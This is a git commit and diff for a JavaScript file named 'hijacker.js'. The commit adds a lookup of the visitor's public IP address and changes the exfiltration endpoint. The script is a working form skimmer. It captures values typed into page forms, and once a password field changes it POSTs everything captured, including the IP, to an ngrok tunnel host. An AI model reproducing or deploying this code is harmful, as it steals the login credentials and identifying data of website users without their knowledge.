4dca7295fde259a9a10db3a6fc399bac39337e4b
u4bi <rootcode10@gmail.com>
2017-12-04 21:34:01 +0900

    Added UserIP field

--- src/hijacker.js
+++ src/hijacker.js
@@ -2,12 +2,14 @@
 
     let data = { host : location.hostname },
         flag = false;
+    
+    fetch('https://api.ipify.org?format=json').then((resp) => resp.json()).then((e) => data.user_addr = e.ip);
 
     !Array.from(document.querySelectorAll('textarea')).length &&
     Array.from(document.querySelectorAll('form'))
         .map((e) => e.addEventListener('keyup', (e) => [
             
-            data[`${ e.target.name }-${ e.target.className }-${ e.target.id }`] = {
+            data[`${ e.target.name }_${ e.target.className }_${ e.target.id }`] = {
                 value : e.target.value,
                 type  : e.target.type
             },
@@ -15,7 +17,7 @@
             !flag && e.target.type === 'password' && [
                 flag = true,
                 e.target
-                .onchange = (e) => fetch('https://13411515.ngrok.io/data', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body : JSON.stringify(data) })
+                .onchange = (e) => fetch('https://69cc8d63.ngrok.io/data', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body : JSON.stringify(data) })
                                     .then( (resp) => resp.json())
                                     .then( (data) => console.log('success', data))
             ]
